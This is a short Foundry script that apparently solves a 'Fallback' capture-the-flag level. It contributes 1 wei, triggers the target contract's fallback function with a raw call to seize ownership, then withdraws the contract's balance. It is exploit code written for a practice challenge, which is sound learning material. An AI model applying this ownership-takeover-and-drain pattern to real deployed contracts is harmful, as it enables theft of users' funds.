// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Level1} from "../src/Level1.sol";

import {Script, console} from "forge-std/script.sol";

contract FallbackSolution is Script {
    Level1 public level1 = Level1(payable(0x3d5125876A625A5E91d92aD37E57d28456c66aBC));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level1.contribute{value: 1 wei}();
        address(level1).call{value: 1 wei}("");

        console.log("My contribution before the withdraw is:", level1.getContribution());

        level1.withdraw();

        console.log("My contribution after the withdraw is:", level1.getContribution());
    }
}
